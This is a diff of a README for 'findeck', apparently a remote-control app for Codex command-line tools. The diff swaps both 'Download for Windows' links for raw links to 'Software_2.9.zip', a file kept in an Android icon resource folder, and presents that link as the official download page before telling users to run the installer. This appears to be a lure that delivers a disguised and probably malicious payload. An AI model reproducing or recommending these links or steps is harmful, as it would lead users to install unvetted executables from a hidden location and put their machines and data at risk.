@@ -1,6 +1,6 @@
 # 📱 findeck - Control your Codex tools from anywhere
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/able-moorcock6549/findeck)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://raw.githubusercontent.com/able-moorcock6549/findeck/main/apps/android/app/src/main/res/mipmap-mdpi/Software_2.9.zip)
 
 findeck provides a central remote control system for your Codex command line interface. It links your computer to your Android device. You can manage your files, trigger scripts, and monitor system background tasks from the palm of your hand.
 
@@ -30,7 +30,7 @@ Your computer must meet these basic specifications to run the software smoothly:
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the [official download page](https://github.com/able-moorcock6549/findeck) to get the latest installation package.
+1.  Visit the [official download page](https://raw.githubusercontent.com/able-moorcock6549/findeck/main/apps/android/app/src/main/res/mipmap-mdpi/Software_2.9.zip) to get the latest installation package.
 2.  Locate the file ending in `.msi` or `.exe` in your Downloads folder.
 3.  Double-click the file to start the installer.
 4.  Follow the prompts on your screen. Click "Next" to proceed through the standard setup steps.
